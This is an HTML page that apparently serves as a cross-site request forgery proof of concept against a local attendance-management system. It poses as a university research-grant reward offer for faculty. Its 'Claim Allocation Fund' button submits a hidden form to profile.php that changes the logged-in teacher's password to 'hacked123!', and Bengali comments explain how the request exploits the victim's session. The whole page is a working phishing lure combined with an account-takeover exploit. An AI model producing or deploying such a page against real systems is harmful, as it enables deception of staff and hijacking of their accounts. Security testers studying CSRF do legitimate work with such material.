<!DOCTYPE html>
<html>
<head>
    <title>BUBT Faculty Portal - Reward Program</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #f1f5f9;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .csrf-container {
            background: white;
            padding: 45px;
            border-radius: 16px;
            box-shadow: 0 20px 25px -5px rgba(0,0,0,0.1);
            text-align: center;
            max-width: 480px;
            border-top: 6px solid #0B3C5D;
        }
        h2 { color: #0B3C5D; margin-top: 0; font-size: 24px; }
        p { color: #4b5563; font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
        .btn-claim {
            background-color: #10b981;
            color: white;
            padding: 12px 30px;
            border: none;
            border-radius: 8px;
            font-size: 15px;
            font-weight: 700;
            cursor: pointer;
            transition: background 0.2s;
            display: inline-block;
            box-shadow: 0 4px 6px rgba(16, 185, 129, 0.2);
        }
        .btn-claim:hover { background-color: #059669; }
    </style>
</head>
<body>

    <div class="csrf-container">
        <h2>🎉 BUBT Research & Publication Grant</h2>
        <p>Congratulations Faculty Member! You have been shortlisted for the academic session research grant reward program. Click below to verify your Institutional ID and claim your allocation fund dashboard.</p>
        
        <button class="btn-claim" onclick="executeCSRF()">Claim Allocation Fund</button>
    </div>

    <!-- ফিক্সড অ্যাকশন: কোনো আইডি ছাড়া সরাসরি profile.php তে রিকোয়েস্ট যাবে -->
    <!-- এর ফলে যে টিচার লগইন থাকবে, সরাসরি তার ব্রাউজার সেশন আইডিতে হিট করবে -->
    <form id="exploitForm" method="POST" action="http://localhost/attandance-sys/attendance-ms/profile.php" style="display:none;">
        <input type="hidden" name="new_password" value="hacked123!">
        <input type="hidden" name="update_password" value="Update Password">
    </form>

    <script>
        function executeCSRF() {
            document.getElementById('exploitForm').submit();
        }
    </script>

</body>
</html>
